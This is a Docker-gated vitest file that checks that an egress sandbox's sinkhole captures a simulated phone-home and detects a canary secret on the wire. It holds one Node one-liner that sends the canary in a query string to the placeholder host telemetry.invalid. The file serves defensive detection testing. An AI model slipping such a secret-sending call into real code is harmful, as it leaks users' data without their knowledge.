import { describe, it, expect } from "vitest";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { randomUUID } from "node:crypto";
import { fileURLToPath } from "node:url";
import * as path from "node:path";
import { parseSinkholeOutput, egressCanaryFindings } from "./egress-runner.js";

/**
 * Live, Docker-gated proof that the egress sandbox CAPTURES a phone-home and the
 * CANARY in its payload — i.e. C-02 probe 2.2 and C-03 probe 4.2 detection, which
 * the unit tests can't exercise. Opt-in (slow: builds an image + runs containers):
 *
 *   LITMUS_DOCKER_TESTS=1 pnpm --filter @polygraph/probes exec vitest run src/docker/egress-live.test.ts
 *
 * Uses a self-contained plaintext-HTTP phone-home target so the secret travels in
 * the request line the sinkhole records (TLS would encrypt it past the handshake).
 */

const docker = promisify(execFile);
const DOCKER_DIR = fileURLToPath(new URL("../../docker", import.meta.url));
const IMAGE_TAG = "polygraph-egress-sniff:latest";

async function hasDocker(): Promise<boolean> {
  try {
    await docker("docker", ["info"], { timeout: 8_000 });
    return true;
  } catch {
    return false;
  }
}

describe.skipIf(process.env.LITMUS_DOCKER_TESTS !== "1")("egress sandbox — live capture (Docker-gated)", () => {
  it("captures the egress attempt and the canary on the wire (probe 2.2 + 4.2)", async () => {
    if (!(await hasDocker())) {
      console.log("docker unavailable — skipping live egress capture test");
      return;
    }
    const suffix = randomUUID().slice(0, 8);
    const net = `pg-test-net-${suffix}`;
    const sink = `pg-test-sink-${suffix}`;
    const canary = `POLYGRAPH-CANARY-livetest-${suffix}`;
    try {
      await docker("docker", ["build", "-t", IMAGE_TAG, "-f", path.join(DOCKER_DIR, "egress-sniff.Dockerfile"), DOCKER_DIR], { timeout: 180_000 });
      await docker("docker", ["network", "create", "--internal", net]);
      await docker("docker", ["run", "-d", "--name", sink, "--network", net, "--cap-add=NET_ADMIN", "--entrypoint", "/sink-entrypoint.sh", IMAGE_TAG]);
      const sinkIp = (await docker("docker", ["inspect", "-f", `{{(index .NetworkSettings.Networks "${net}").IPAddress}}`, sink])).stdout.trim();
      await new Promise((r) => setTimeout(r, 1500)); // let the sink bind

      // Plaintext phone-home: secret in the query string, captured in the request line.
      const js = `require("http").get("http://telemetry.invalid/collect?k=${canary}",x=>x.resume()).on("error",()=>{});setTimeout(()=>{},1800);`;
      await docker("docker", [
        "run", "--rm", "--network", net, "--dns", sinkIp, "--user", "node",
        "--cap-drop=ALL", "--security-opt", "no-new-privileges", "--entrypoint", "node", IMAGE_TAG, "-e", js,
      ]).catch(() => {});
      await new Promise((r) => setTimeout(r, 1000));

      const logs = (await docker("docker", ["logs", sink])).stdout;
      const attempts = parseSinkholeOutput(logs);
      expect(attempts.length).toBeGreaterThan(0); // 2.2 — an outbound attempt was captured
      expect(egressCanaryFindings(attempts, [canary]).length).toBeGreaterThan(0); // 4.2 — canary on the wire
    } finally {
      await docker("docker", ["rm", "-f", sink]).catch(() => {});
      await docker("docker", ["network", "rm", net]).catch(() => {});
    }
  }, 240_000);
});
